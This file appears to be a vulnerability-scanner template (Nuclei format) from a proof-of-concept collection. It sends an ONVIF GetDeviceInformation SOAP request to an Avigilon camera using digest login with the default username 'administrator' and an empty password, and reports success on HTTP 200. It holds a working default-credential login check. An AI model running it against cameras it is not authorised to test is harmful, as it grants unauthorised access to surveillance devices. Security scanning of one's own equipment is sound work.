poc_all/auth/avigilon-digest-login.yaml

id: avigilon-digest-login
info:
  author: nate
  description: Attempt default credentials to avigilon camera
  metadata:
    max-request: 1
  name: avigilon-digest-login
  severity: high
  tags: tech,avigilon
requests:
- digest-password: ''
  digest-username: administrator
  matchers:
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /onvif/device_service HTTP/1.1

    Host: {{Hostname}}


    <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:ns1="http://www.onvif.org/ver10/device/wsdl"><soap:Body><ns1:GetDeviceInformation></ns1:GetDeviceInformation></soap:Body></soap:Envelope>

    '
